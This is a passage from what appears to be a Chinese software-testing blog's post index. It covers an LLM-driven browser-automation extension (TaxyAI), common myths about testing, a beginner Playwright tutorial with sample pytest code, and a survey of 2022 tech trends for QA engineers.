无论我们选型的工具是webdriver还是playwright，很多团队都喜欢进行一些定制化的二次开发，核心的诉求就是：让不懂代码的人也可以进行web自动化测试。比如\n用配置文件去替代代码 提供录制回放能力 用写excel的方式编写用例 提供web ui编写用例的方式 TaxyAI 总的看来，工具一直在进步，但自动化测试的核心诉求似乎一直都没有很好的被满足，或者说是自动化测试学习门槛相对比较高，从而参与到其中的测试人员相对较少，大部分情况下都是一群人的狂欢，大部分人的围观。\n最近gpt大语言模型风靡全球，很多有意思的应用应运而生，无意间看到了一个能使用自然语言进行web自动化的实现，演示效果让人有些感叹：也许这才是web自动化测试的正确姿势。地址在这里：https://github.com/TaxyAI/browser-extension 。这是一个简单的chrome插件，安装好配置一下chatgpt4的api key之后就可以用了。\n先看演示，这里直接让AI安排明天上午10点的站会，并且邀请david@taxy.ai参加\n因为我没有gpt4的api key，我下载下来用gpt3.5跑了一下，在简单的页面上确实可以实现用自然语言指挥浏览器干活的功能。不需要写代码，不用理解html的dom结构，直接想要做什么就让浏览器去做，这种交互是自然而高效的。\n奇妙的实现方式 因为项目是开源的，所以就简单的看了一下代码，结合文档上的解释，发现工具的实现方式非常的巧妙，以后这种奇妙的实现方式可能会产生出各式各样更多的产品实现。\nTaxy在网页上运行内容脚本来拉取整个DOM。它简化所收到的HTML,仅保留互动或语义上重要的元素,如按钮或文本。它为每个互动元素分配一个ID。然后,它“模板化”DOM以进一步减少token的消耗。\nTaxy发送简化的DOM以及用户的指令给所选的LLM(当前支持GPT-3.5和GPT-4)。Taxy告知LLM有两种与网页互动的方法:\nclick(id)- 点击与该id关联的互动元素 setValue(id,text)- 聚焦在文本输入框,清除其现有文本,并在该输入框中键入指定的文本 当Taxy从LLM获得完成时,它会解析响应以获取操作。如果满足以下任何条件,操作周期将在此阶段结束:\nLLM认为任务已完成。LLM可以返回一个指示,表示基于DOM的状态和截至此时的操作历史,它认为用户的任务已完成。 用户停止了任务的执行。用户可以在任何时间停止LLM的执行,而无需等待它完成。 出现错误。Taxy的安全优先架构会自动停止执行意外响应。 Taxy使用chrome.debugger API执行操作。\n该操作添加到操作历史记录,Taxy循环回到第1步,并解析更新的DOM。所有先前的操作都作为用于确定下一个操作的提示的一部分发送给LLM。Taxy目前可以为单个任务完成最大50个操作,尽管在实践中,大多数任务需要少于10个操作。\n简单总结一下就是：taxy首先把网页的html变成一个简化版本，比如只保留button，text和link之类的，并为每个dom元素分配1个id，然后把这个简化的dom和用户的意图发送给gpt，gpt根据提示给出具体的操作指令返回给taxy，然后taxy解析指令，调用chrome的api进行点击和输入文本的操作。\n直接看一下taxy的prompt吧，这里是用魔法打败魔法的地方。\n1 2 3 4 5 6 7 8 9 const systemMessage = ` You are a browser automation assistant. You can use the following tools: ${formattedActions} You will be be given a task to perform and the current state of the DOM. You will also be given previous actions that you have taken. You may retry a failed action up to one time. This is an example of an action: \u0026lt;Thought\u0026gt;I should click the add to cart button\u0026lt;/Thought\u0026gt; \u0026lt;Action\u0026gt;click(223)\u0026lt;/Action\u0026gt; You must always include the \u0026lt;Thought\u0026gt; and \u0026lt;Action\u0026gt; open/close tags or else your response will be marked as invalid.`; 所以taxy每次都把之前进行过的操作和dom发给gpt4，然后然gpt4自己去判断下一步要怎么做，嗯，原来现在代码可以这样写，学习了。\n亮点 taxy目前还在进化中，所以暂时没上架google的扩展商店，不过最近看到代码有重构过，并加上了核心的单元测试，相信不久的将来我们是可以直接下载使用的。\ntaxy的亮点非常让人印象深刻\n把html简化后交给gpt进行行为的推断，让gpt决定下一步该怎么做，这可能是以后很多工具可能采用的方式。 天生支持多语言 实现方式的脑洞很大 不足 dom文本就算简化后也很大，每次使用特别费token，其实就是费钱 我在试用过程中发现操作可能会没有办法终止 总结 我：写一段话描述一下人工智能技术会给自动化测试带来什么，要求专业简洁，100个中文字符以内。\nClaude：人工智能技术将给自动化测试带来深度变革。人工智能可自动生成测试用例,智能识别测试目标,智能分析测试结果。智能机器可学习历史测试数据,推理判断当前测试需求,进行自主化测试。这将大大提高测试效率和质量,减轻测试人员工作量。这是自动化测试发展的必然方向。\nchatgpt 3.5: 人工智能技术能够提高自动化测试的效率和精度，例如自动化测试可以利用AI算法进行智能筛选和调整测试用例，同时也可以加强对于自动化测试结果的分析和挖掘。\nbing: 人工智能技术可以提高自动化测试的效率和质量，减少重复工作和人为错误，实现更智能的测试过程和结果 。人工智能技术可以通过图像识别、数据分析、自动化编码等方式，模仿人类的测试行为和思维。\nbard: I am an LLM trained to respond in a subset of languages at this time, so I can\u0026rsquo;t assist you with that. Please refer to the Bard Help Center for the current list of supported languages. 😭\n","date":"2023-04-13T15:53:34+08:00","permalink":"zh.ethanhan.cc/p/web%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E7%9A%84%E6%99%BA%E8%83%BD%E9%9D%A9%E5%91%BDai%E5%A6%82%E4%BD%95%E6%8E%A8%E5%8A%A8%E8%BD%AF%E4%BB%B6%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81%E7%9A%84%E6%9C%AA%E6%9D%A5/","title":"web自动化测试的智能革命:AI如何推动软件质量保证的未来"},{"content":"软件测试实际上不像看上去那么容易。为了了解web产品测试可能包含的隐藏和意外，我们将分析与此类活动相关的十大最流行的误解。\n误解1：测试很容易 很多IT界人士（但不是测试人员）认为，软件测试并不难。它只是在一个图形界面中点击按钮而已。但实际上，一切并不那么简单。首先，QA工程师必须全面研究一个产品，收集有关它的信息，提出并反驳假设，等等。 仅仅发现缺陷并不能使你成为一名测试人员。要成为一流的QA工程师，你必须能够理解软件和测试理论，提出正确的问题，并有效地找到相关信息。\n误区2：软件测试很无聊 有人可能认为测试人员的日常工作很枯燥\u0026ndash;点击按钮，将设计与布局相比较。但如果这么简单，就不会有QA工程师了\u0026ndash;所有这些工作都会由机器完成。 测试人员每天都在与业务和客户的实际需求互动。他们看的是软件内部的工作方式。而且，测试的类型相当多样\u0026ndash;从可用性测试到性能测试和网络安全一应俱全，而且值得深入。\n误区3：QA工程师想黑掉一切 事实上，测试人员不是黑掉程序，而是黑掉开发人员的幻觉。他们不想破坏任何东西；他们只是试图看看一切是如何工作的。有时测试结果与大家的期望完全不一致。\n误区4：完美主义是测试员工作成功的关键 事实上，情况恰恰相反。过度的完美主义只会阻碍正确的测试（就像在任何其他活动领域一样）。一个典型的完美主义者不能准确地意识到何时停止测试。而且，他也很难接受这样一个事实：永远不会有一个没有缺陷的完美的web产品。\n误区5：测试人员不需要了解软件的内部实现 实际上，一流的测试人员应该能够理解现代技术和分析软件结构。编程语言的基础知识有助于此。你不必创建你自己的程序代码，只要至少了解一切是如何设置和工作的基础知识。\n误区6：一切都有自动化，人工测试将消失 在任何情况下，你都不应该把QA的工作分为自动化和手动测试。自动化和手动测试人员都用他们的头脑工作，他们的工具并不那么重要。当然，你可以（也应该）使用先进的技术，但不要忘记，你不可能完全实现测试自动化，就像你不可能实现研究过程自动化。\n误区7：测试拖慢了开发过程 一些产品公司的员工相当认真地认为测试过程是一个简单的活动。而且他们确信，程序代码中要么没有缺陷，要么其数量微不足道。因此，当开发人员完成他们的前端工作时，他们认为实现web产品的大任务已经基本完成。但有时，在这个 \u0026ldquo;差不多 \u0026ldquo;的背后隐藏着大量的额外工作。软件测试和其他许多工作一样，是一个创造的过程。这完全取决于要完成的任务和要克服的风险。\n误区8：QA工程师和开发人员总是缠斗在一起 互联网上有很多关于开发和测试在对方车轮上装上辐条的有趣故事。但在实践中，这并不那么相同。只有当开发部门认为测试人员在控制他们时才会出现问题，或者，当我们用发现的缺陷列表来影响开发部门的绩效时。\n误区9：测试人员对他们发现的每个bug都很兴奋 发现错误的兴奋感可能只发生在初级测试人员身上。 但随着时间的推移，它就会过去。熟练的员工会更加沮丧，因为这意味着他们将不得不做额外的工作。而且，这也推迟了任务的开始（部署网站，上架移动应用程序，等等）。质量保证的有效性并不取决于发现的错误的数量。他们工作的结果是一个经过质量测试的产品，一般来说，它能满足感兴趣的用户的需求。\n误区10：如果你写了好的代码，你就不需要测试人员了 这种观点在产品公司中非常普遍，那里盛行写自动测试的理念。但是，软件发展得越快，周围环境的变化越快，测试过程就越有意义。\n而这个名单还可以继续下去。但最主要的是，除了测试人员本身，没有人可以成为这个领域的专家。相应地，只有QA工程师可以自信地说出什么是事实，什么又不是。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/10%E5%A4%A7%E6%B5%81%E8%A1%8C%E7%9A%84%E5%85%B3%E4%BA%8E%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E8%AF%AF%E8%A7%A3/","title":"10大流行的关于软件测试误解"},{"content":"playwright是微软推出的一款自动化测试工具，据说开发小组的核心人员来自google的puppeteer团队，真是一出生就有了个好爹而且好爹的亲爹也是爹中的战斗机，这就让人非常期待了。\n下载与安装 playwright应该是使用JavaScript进行开发的，不过考虑到大部分的测试同学可能对python更为熟悉，这里的安装就以python版本为例。\n在命令行中输入pip install pytest-playwright，等playwright安装成功之后再输入命令playwright install，这条命令的作用是安装测试所需要的各种浏览器支持，相比较selenium需要先安装浏览器再安装相应版本的driver，playwright的初始化工作就显得轻松了很多。\n第一个用例 接下来按照官方文档里的例子我们来跑第一个playwright用例。\n新建一个名为test_my_app.py的文件，然后把文档中的例子一字不差的进行拷贝粘贴。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import re from playwright.sync_api import Page, expect def test_homepage_has_Playwright_in_title_and_get_started_link_linking_to_the_intro_page(page: Page): page.goto(\u0026#34;https://playwright.dev/\u0026#34;) # Expect a title \u0026#34;to contain\u0026#34; a substring. expect(page).to_have_title(re.compile(\u0026#34;Playwright\u0026#34;)) # create a locator get_started = page.locator(\u0026#34;text=Get Started\u0026#34;) # Expect an attribute \u0026#34;to be strictly equal\u0026#34; to the value. expect(get_started).to_have_attribute(\u0026#34;href\u0026#34;, \u0026#34;/docs/intro\u0026#34;) # Click the get started link. get_started.click() # Expects the URL to contain intro. expect(page).to_have_url(re.compile(\u0026#34;.*intro\u0026#34;)) 然后在命令行里输入pytest，视网速而定，等待个10秒钟左右，就可以看运行结果了。\n1 2 3 4 5 collected 1 item test_my_application.py . [100%] ================================================================= 1 passed in 7.08s ================================================================== 上面的用例去到了playwright的官网，定位并点击了名为Get Started的链接，最后断言页面上的url里含有intro这个字符串。\n1 passed表示运行了1个用例并且用例成功通过。另外默认情况下playwright是以headless的模式运行的，这表示运行的过程中浏览器在后台打开和工作，所以看不到浏览器界面是常规操作，不需要紧张和疑惑。\n如果遇到了网络超时的情况，可以试试用下面的用例去替换。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import re from playwright.sync_api import Page, expect def test_homepage_has_Playwright_in_title_and_get_started_link_linking_to_the_intro_page( page: Page ): page.goto(\u0026#34;http://www.itest.info/\u0026#34;) # Expect a title \u0026#34;to contain\u0026#34; a substring. expect(page).to_have_title(\u0026#34;重定向科技\u0026#34;) # create a locator plan = page.locator(\u0026#34;css=.navbar-nav li \u0026gt;\u0026gt; nth=1 \u0026gt;\u0026gt; a\u0026#34;) # Expect an attribute \u0026#34;to be strictly equal\u0026#34; to the value. expect(plan).to_have_attribute(\u0026#34;href\u0026#34;, \u0026#34;/plans\u0026#34;) # Click the get started link. plan.click() # Expects the URL to contain intro. expect(page).to_have_url(re.compile(\u0026#34;.*plans\u0026#34;)) 脚本录制 playwright支持通过录制的方式生成部分的脚本。\n作为爬虫使用 ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/10%E5%88%86%E9%92%9F%E7%8E%A9%E8%BD%ACplaywright/","title":"10分钟玩转playwright"},{"content":"国外有机构展望了2022年值得测试和开发同学关注的技术趋势，我在这里简单的给大家介绍一下，路漫漫其修远兮，大家一起求索吧。\n混合组织成为常态 2022年很明显，有些人不会返回办公室，至少不会一直返回办公室。病毒大流行开始时最大的挑战之一就是远程工作的弱点和新机遇。 人们远程工作面临的最大困难是深陷工作无法自拔。另一方面，人们承认他们在在线交流和协作方面遇到的困难较少。全球 CIO 调查显示，截至 2021 年 3 月，31% 的受访者预计将继续永久远程工作。据另一项调查显示，73％的雇员要求更灵活的工作选择。\n对测试人员意味着什么 由于远程管理的困难降低使得原本对外包保持警惕的公司放弃了一些担忧。外包 QA 团队是内部团队的延伸。如果正确的设置流程，管理外包并不具有挑战性。更多的公司可能会开始使用外包的 QA 资源。\n对通讯工具的需求不断增长 2020年3月，在线会议软件的使用量猛增。Zoom 打破下载记录，股价上涨超过100%，Google Hangouts提供半年免费使用高级计划，Microsoft Teams一个月赢得了1200万用户。这样的故事在2021年听起来并不令人震惊。我们已经加入了用户行列，成为统计数据的一部分。 组织仍在不断寻找可靠的通信和合作软件工具。远程办公不应限制工作活动。\n反过来，科技公司的目标是增强他们的通信工具，加入更多功能，以提供更大的灵活性。 例如，Slack 推出了 Huddles——一种轻量级的音频优先通信功能，允许用户在不安排面对面或视频会议的情况下接听电话。此外，现在用户可以发送音频和视频消息，这对许多人来说也是一个很大的好处。\n对测试人员意味着什么 各种规模和各行各业的公司都在使用通信工具，市场广阔，现有工具还有改进空间。随着新功能的添加，QA 部门将忙于进行功能、集成和回归测试。 喜欢使用定制解决方案的公司可能会决定升级其内部平台。例如，添加与 Zoom、Skype、Meet 或其他一些工具的集成将能够更快地访问视频通话功能。这些改进总是伴随着 API 和回归测试。\n企业可能对更复杂的产品感兴趣，例如具有多客户端功能的内网视频平台、媒体资产管理等。在这种情况下，提供商应该准备好提供具有高级定制功能的产品。从头开始创建这样的平台需要仔细的市场分析，然后进行广泛而细致的测试。\n吸引眼球，拉拢更多的用户 人们越来越意识到社交网络和品牌可以如何操控他们的思想。此外，2021年的数据表明，用户对新奇产品保持兴奋的程度是有限的，比如clubhouse。新媒体专家用多篇文章总结了这些事件，一些人在新社交网络的早期就预测到了clubhouse这样的结果，以及总结了该产品的失败原因。\n显然，创作者没有看到长期的潜力，逐渐停止为平台增值。 实时性的功能（例如只能进行直播而无法进行广播录制）营造了一种怀旧/复古的氛围，然而大房间的访问受限和人数限制导致了激怒和两极分化。 算法和用户体验都远非完美。Clubhouse 围绕最初的炒作发展，而不是专注于平台改进 。 令人惊讶的是，TikTok 仍然是派对之王，逐渐吸引了更多不同的受众。当然，Instagram 也不容忽视，其通过推出 Reels 做出了回应。无论是良好的实现还是熟悉的平台，用户似乎都对它感到满意。\n对测试人员意味着什么 把用户牢牢的绑在平台上，对用户忠诚度甚至注意力的竞争变得更加激烈。 这意味着软件开发团队现在应该更加关注最终用户体验。当然，很大程度上决定开发新应用或功能的人并非技术专家。然而，软件开发人员是实现这些想法的人，而软件测试人员是接触结果的人。功能、UI 和兼容性测试将非常重要。 最后，在流程中涉及业务分析师的团队将更好地了解市场契合度、商业机会和规模。仔细的分析和精心编写的文档有助于避免逻辑空白和不适合市场/需求。\n内容变现的新机遇 点播内容已经存在一段时间了。甚至令人惊讶的是，我们没有在2021年软件工程趋势中发现跟它的相关的解决方案。 如今愿意免费分享独家内容的创作者越来越少,社交网络也在不断探索内容变现的机会。 例如，Instagram 的 CEO 一直对订阅创意持开放态度。该平台开始为拥有超过 1 万粉丝的用户体验了付费徽章，以便在直播期间使用。此外，Instagram 似乎正在开发独家故事功能，其实就是视频版的clubhouse，并暗示某种订阅行为。\n除了社交媒体，还有一些服务本身就鼓励内容变现并致力于提供这样的机会。例如，Overwolf——一个使创作者能够构建游戏内物品并将其货币化的平台——在 D 轮中融资了 7500 万美元，并计划使用这些资金来支持用户生成的内容创作 。 与此同时，由于持续的封城，全球的现场表演被取消，音乐家也开始寻找现场直播的机会。它始于社交媒体，但最终演变为更加深思熟虑的策略。\n对测试人员意味着什么 更多的支付网关和安全测试即将到来。每当我们处理订阅时我们必须测试不同的支付方式，以便用户可以正常付费。\n此外，不同行业很可能会出现更多像 Overwolf 这样的新颖不带任何标签的解决方案。也就是说，QA 工程师可以期待大量的集成和交互操作测试，以及更多的定制化和插件化服务的测试机会。\n另一方面，其中一些解决方案需要更复杂的平台架构。过去标品网站现在需要测试与第三方解决方案的集成、多种性能场景和版权保护策略（例如，确保无法使用第三方扩展下载限时视频）。\n用户变得更加挑剔 随着用户越来越熟悉不同的软件解决方案，他们的要求也越来越高。人们已经有足够的经验来判断什么是好的，什么是不好的。他们倾向于分析、比较和提出改进建议——即使这不是特意为之的。\n我们在 Google Play 和 App Store 上阅读了大量评论，以了解用户抱怨最多的内容。事实证明，大多数负面反馈都涉及与功能相关的问题。通常，这些问题与核心功能、逻辑模糊、令人困惑的更新和整体用户体验有关。\n当然，响应存在主观因素（有时是恶作剧，例如全球学校学生将 Google 课堂评为一颗星，希望商店将其撤下）。然而，在大多数情况下，用户的评论可以给出产品开发的进一步方向的线索。\n对测试同学来说意味着什么 100%的测试覆盖率和完全没有缺陷的产品是不存在的。不过这仍然是用户在安装应用程序或注册新服务时希望得到的。 从最终用户的角度评估产品质量至关重要。 QA 专家应该继续传达他们的专业知识并为开发带来价值，尤其是在我们谈论紧迫的排期和重要的部署时。 通过适当的分析和测试，大多数导致产品评级较低的问题都可以避免。竞争越激烈，在推出产品之前对其进行充分的测试就越重要。 软件测试人员将继续对软件功能、UI、兼容性和性能给予足够的关注。 随着越来越多的团队开始采用自动化，人工测试的重点可能会随着时间的推移转移到探索性和临时测试上。但这是另一个需要讨论的点了。\n无所不用其极的定制和个性化 越来越少的人将人工智能的未来想象为机器推翻人类统治并接管世界。让我们更专注于人工智能技术如何帮助实现更好的业务逻辑吧。用户希望产品注意到他们的个性，而人工智能在是观察和预测方面有巨大的优势和潜力。定制可以使来自不同行业的各种企业受益。下面仅举几个例子\n电商\n根据个人喜好推荐临场感更生动的产品； 根据位置显示优惠和活动； 替代搜索方法，例如语音和图像搜索； 引入新的支付方式，包括加密货币； 聊天机器人，可以更轻松地浏览网站； 整合 UGC，例如视频评论，以提高参与度。 当今的信息过于泛滥导致用户疲劳和分心，因此为用户量身打造商品和活动变得越来越重要，这是提升转化率的关键。\n网上交友\n随着疫情的爆发网上交友变得越来越普遍。例如，Tinder 报告说，与疫情爆发前的时间相比，每天发送的平均消息数量增加了 19%，对话时间增加了 32%。\n人工智能可以在一些方面提升交友软件的体验\n根据个人资料图片上的面部图片找到志同道合的小伙伴； 过滤虚假账户（机器人）和攻击性/不当内容； 纠正语法和拼写错误 娱乐\n原文作者举了netflex的推荐策略来说明个性化推荐对于流媒体服务来说是多么重要。其实在国内大部分的娱乐产品都把个性化推荐放在了最核心的产品逻辑和体验上，你越喜欢什么越对什么感兴趣，平台就不停的向你推荐相关的内容，这点大家都 应该是非常熟悉了。\n对测试同学来说意味着什么 未来，企业将越来越依赖人工智能技术。因此，软件工程师和测试人员将更加熟悉 AI 解决方案和 ML 算法。\n首先，跟上创新和相应法规的步伐至关重要。 随着可穿戴设备、物联网小工具等的加入，QA 专家可以使用的设备范围将会增加。为了提供更真实有用的经验和反馈，测试团队不能仅仅依靠自动化。只有真正的用户才能教 AI 助手识别带有不同口音的方言和普通话。\nXR 技术扩展了现实的边界 让我们从一个有着真实应用的场景开始这一段：在电子商务中使用 AR。它可以让用户查看一件家具如何适合您的空间在线试穿衣服等等。 XR 技术在教育方面也具有巨大的潜力。它可以为不同年龄段的学生创造身临其境的多感官体验。它还可以改善职业培训，特别是对于具有高度复杂性和危险场景的任务。\n增强现实、虚拟现实和元宇宙\n元宇宙的想法并不新鲜。2003 年的电子游戏《第二人生》被称为第一个元宇宙。 简而言之，这是一个您从舒适的家中踏入的半虚拟世界。或者，正如另一种定义所言，“我们现实世界的数字版本，具有想象中的每一种超现实可能性。”\n引用马克·扎克伯格的话来说，“虚拟实境是社会关系的下一步发展。” 讽刺的是，人们往往会想到为什么facebook的创始人要鼓吹这个概念，好像人们现在花在这个应用上的时间还不够多一样。\n元宇宙这个词本身来自 Neal Stephenson 的小说——Snow Crash (1992)——其中 元宇宙 提供了一种逃离现实世界的危险方式。从经典流派（黑客帝国和阿凡达）到热门电视节目（黑镜、西部世界、碳变），甚至动漫（刀剑神域）——一些影视作品中元宇宙并没有预示着光明的未来。只有准备好的头号玩家给人一种相当积极的氛围，我们可以称之为幸福的结局。\n无论是流行文化还是传播负面氛围的扎克伯格，元宇宙可能更像是托尼·斯塔克的贾维斯——只是一个相当智能的系统，它采用 NLP 技术和 XR 工具来帮助你完成重要任务。\n超越流行文化的元宇宙 公众如何理解 元宇宙的能力？从理论上讲，人们期望其提供游戏、社交、工作、学习、购物、自我表达等诸多体验。 如果它变得无所不包，营销和广告将成为生态系统的一部分，就像现在在 Facebook 和 Instagram 一样。 想象一下，在由一家真正的旅行社组织的虚拟法国之旅之前，先去一家虚拟商店购买飞行用品。这听起来更令人兴奋还是更令人不安？考虑到公司如今管理其平台的方式，人们对此表示担忧也就不足为奇了。人类承受的太多了。 科技行业仍在研究这一切。The Verge 总结了到目前为止我们所知道的一切。请继续关注更多。我们也会这样做。\n对测试同学来说意味着什么 推出元宇宙结构的条款及其规模尚不清楚。XR 技术与日常生活交织在一起的想法令人深思。或许，我们可以期待 XR 测试的逐渐增加。\n一些软件测试公司开始准备是有道理的。但是，重要的是首先评估更改的可行性。 由于其特殊性，与其他技术相比，VR 测试需要更多的投资。特别是，软件测试人员应该对产品进行短时间的接触（大约 15 分钟），以避免疲劳和生理反应变化，毕竟当前技术条件下vr设备穿戴的极限也就是短短的十几分钟。因此，测试所需的时间或使用产品的人数都会增加。\n使用 XR 技术意味着创建更复杂的架构，这些架构对测试来说既有趣又具有挑战性。如果我们很快就开始转向元宇宙，我们将进行不断的学习、技能提升和对互操作性以及用户体验的大量关注。\n过滤虚假信息 当今网络上各种信息鱼目混珠，如何在信息流中过滤出事件的真相确实相当具有挑战性。“后真相”成为2016 年牛津年度词汇，这个概念将继续存在。处理我们收到的信息变得越来越复杂，我们要学会避免操纵和过滤攻击性内容，数字技术的利弊之间只有一线之隔。\n新的技术已经开始关注到这一问题，并给出了自己的解决方案，比如Storyzy这个数据库，拥有基于可靠性分类的数十万个来源（网站、博客和视频频道），如果我们的获得的信息在这个数据库的白名单中，那么信息的可靠性将有较大的保障。\n对测试同学来说意味着什么 大数据和人工智能可能会改变游戏规则。开发和 QA 团队可以与私营部门和政府部门合作。无论如何，都会有一些令人兴奋的技术可以使用。 当谈到客观性与偏见时，我们正在处理一些敏感的道德问题。技术专家需要了解隐私问题和相关法规。对于此类平台，安全性将变得至关重要。只有在更高级别的安全技术的支持下，那些智能算法才能带来真正的价值。\n心理健康议程的兴起 社交媒体对人们心理健康的影响已经体现的越来越明显。有多少人因为在社交网络上被攻击而现实生活中产生自闭？而又有多少人因为沉迷网络而心理健康上在发生着潜移默化的改变？\n另外疫情带来的相关的社会孤立和长期压力也会对心理健康产生严重影响。\n好消息是，心理健康议程正在被去污名化。数字化的心理护理的新解决方案经常出现，比如有的应用程序会提示你冥想，另一些应用会让你暂停刷手机来缓解压力。\n对测试同学来说意味着什么 开发心理健康软件是另一个伟大的事业，技术专家可以带来巨大的价值。开发人员将处理敏感数据并保证其匿名。因此，QA工程师需要特别注意隐私和安全。它们对用户至关重要。 一个更重要的方面是功能。项目团队可能需要一名治疗师来优化工作流程并复制处理某些问题/障碍的相关方法。QA 工程师可能希望在编写需求文档或澄清需求期间进行跨职能沟通。 心理健康应用程序通常依赖于通信功能。例如，许多解决方案由专业治疗师提供，并实时提供应用内帮助。它可以是准备充分的机器人，也可以是与专家的应用程序内沟通，或者两者兼而有之。梅开二度了，这里需要使用 AI/ML 和即时通信功能，包括传输文本和音频。\n最后，用户体验对于此类应用程序可能比任何其他解决方案都更重要。尽管 QA 专家对这方面没有完全和唯一的责任，但业务分析师应该提出来。\n积极采用远程医疗解决方案 随着医疗保健技术的发展，供应商开始更积极地采用数字解决方案——原因显而易见。根据麦肯锡的研究，与疫情前相比，远程医疗的使用增加了 38 倍，消费者和供应商都将数字技术视为医疗保健服务的重要组成部分。81% 的医疗保健高管承认其组织中的数字化转型不断加速。 电子健康技术使患者护理和管理更容易、更实惠、影响深远且资源消耗更少。虽然只有大约 10% 的患者在大流行之前使用了虚拟医疗解决方案，但 40 % 的患者表示他们准备在未来使用远程医疗。 消费者对广泛的远程医疗产品表现出兴趣。一些虚拟健康解决方案已经成为我们日常生活中不可或缺的一部分——例如，数字疫苗接种证书、可穿戴设备、监测设备，最有名的就是苹果的iwatch。 一些高度专业化的——例如实验室软件，可以实现更详细和准确进行病情分析，从而彻底改变诊断和治疗的现状. 很明显，医疗机构将继续增加远程医疗平台，以改善医疗服务的提供。下一步是填补市场空白并重新调整基础设施以适应高效的业务和协作模式。\n对测试同学来说意味着什么 QA 工程师可以处理各种任务和测试类型。考虑到远程医疗解决方案的多样性、它们的具体情况和目的，对任何测试活动进行优先排序会很复杂，而且可能毫无意义。 从数据真实性和患者隐私到二维码生成和即时同步——即使在一个系统内，要检查的内容范围也令人印象深刻。 医院最终将为生态系统添加更多数字解决方案。使基础设施协调良好、无缝集成、更具同理心并最终更高效将是软件开发人员和测试人员的首要任务。组织将继续进行云转型，这尤其意味着持续升级测试和对性能（可靠性、可扩展性和可用性）的特别关注。\n教育的数字化转型仍在进行中 联合国教科文组织统计研究所指出，这些学生中几乎有一半在学校停课期间面临访问在线教育的障碍。 2020 年 4 月，在 Coursera、edX 和 FutureLearn 上注册的用户数量是整个 2019 年Class Central 报告期间的两倍。大约 25% 到 30% 的当前 MOOC 用户在病毒大流行期间加入。 埃森哲调查的高等教育机构的代表，受访者所有或几乎100％表示他们的组织今年急需创新； 商业和技术战略对他们的机构来说变得密不可分； 技术民主化对于激发创新变得至关重要； 远程劳动力为难以找到的人才开辟了市场。 96% 的学生认为高质量的数字体验对他们的教育意义重大。他们期望以虚拟方式提供更多的灵活性、更丰富的技术和一些学分。 与此同时，麦肯锡打破了一些关于企业远程学习的神话，确保远程学习如果实施得当，可以带来预期的价值。因此，它可以成为工作场所学习的一个组成部分，长期补充整体教育经验。\n我们可以再次回忆，这是一个前所未有的教育时代。在线学习的局限性和潜力一直在推动教育技术和在线学习的发展。在政府和教育机构寻找方法来填补空白并在紧急情况下使教育成为可能的同时，企业也在探索为所有部门提供更有益健康的教育体验的机会。\n对测试同学来说意味着什么 功能性、兼容性和可访问性在最大程度上决定了用户体验和产品价值。 如果我们要优先考虑特定类型的测试，这些肯定会在列表中。 随着数字化转型的进展，开发团队开始使用各种远程学习解决方案——既可以从头开始创建新产品，也可以根据特定机构的特定需求调整现有平台。 同样，我们将测试旨在更智能的学习体验设计的新内容交付方法。简单来说：个性化用户路径和游戏化是讨论最多的趋势。那么可以猜到，这意味着使用 AI/ML、NLP 和更友好的用户界面。\n越来越多人了解区块链 炒币的人不知道原理，但却为区块链技术带来了更多的关注度。\n对测试同学来说意味着什么 随着公司不断探索区块链对其业务的潜力，对具有领域知识的软件开发人员和测试人员的需求将不断增加。\n世界存在于智能手机中 全球有52.9亿独立手机用户。五分之四的人拥有智能手机。90.9% 的用户通过移动设备访问互联网。人们平均每天在手机上花费 3 小时 37 分钟。应用下载量每年增长 10%。 69.4% 的人在他们的设备上使用购物相关的应用程序，55.4% 的人使用他们的手机买东西。这些只是 Hootsuite 在其最新报告《2021 年全球数字化状况》中分享的一些数据。\n在中国，我们可能已经在 2020 年或更早就感受到了类似的趋势。移动流量份额稳步增长，这并不奇怪。今天，用户在他们的设备上拥有适用于所有内容的应用程序。普通智能手机成为一种战略设备，容纳了人们日常活动所需的所有（或几乎所有）工具。\n对测试同学来说意味着什么 随着时间的推移，更多的人将开始使用智能手机。对于开发人员来说，这意味着针对各种设备和操作系统进行定制。对于 QA 专家来说，这意味着要进行大量的兼容性测试。\n最后，委婉地说，一个不能在广泛使用的设备上运行良好的应用程序是难以成功的。 QA 专家应监控市场以跟踪新设备。QA 公司有必要更新他们的设备库，关注新闻并了解重大更新也很重要，例如新操作系统版本的推出或一些政策的变化，它将使得开发团队针对新配置调整产品。\n对测试自动化的需求不断增长 根据世界质量报告，大约 15%-20% 的测试是自动化的，其中回归测试占很大比例。 不同行业的更多组织正在寻求更智能的自动化测试方案，以实现更高的质量标准和敏捷性。 有两种方式可以满足自动化资源增长的\n聘请更多具有相应技术技能的专家； 采用依赖 AI 和 RPA 的智能自动化。 很多公司仍然面临着实施测试自动化的困难。所选工具的相关性、整体方法的效率、适合特定阶段的技能的缺乏引起了最多的怀疑。\n对测试同学的挑战和机遇 智能自动化使团队可以在更短的时间内完成更多工作,组织也更愿意投资。 因此能够以相关技能和技术支持提高效率的能力成为 QA 公司的巨大竞争优势，现在是开始发展 自动化部门的好时机。 选择你喜欢的任何策略\n雇用更多专家 内部教育和内部招聘 尝试无脚本或低代码工具 DevOps 的进一步探索和采用 这个点就不展开了，以后有机会可以详细讨论。\n对开发和质量保证意味着什么 采用 DevOps 意味着文化、组织和流程的变化。要开始这种转型，组织需要清楚地了解哪些事情需要转型。 下一步将是为所有团队成员制定明确定义的角色。 DevOps 意味着透明度和问责制，以及持续的沟通。它依赖于优先考虑有效解决问题的建设性反馈，并侧重于长期观点而不是快速的一次性解决方案。 成功的 DevOps 实践再次提醒我们，精心编写的文档和强大的流程架构的重要性，无论我们是在谈论内部单位、分布式团队还是外包。\n总而言之 1, 对在线流媒体和通信服务的需求将继续存在。这意味着我们将看到大量的视频和音频功能测试。\n2, 用户希望获得积极的体验，并且通常有其他功能不佳的解决方案。为了跟上竞争对手的步伐，公司应该像以往一样一丝不苟地进行功能和 UI 测试。\n3, 对于那些旨在建立忠诚饭圈文化的公司来说，处理用户反馈是必须的。评论可以为您的产品缺乏什么提供有价值的线索。\n4, 智能个性化和定制将有助于在各个领域创建量身定制的优惠和相关建议。这就是 AI 和 ML 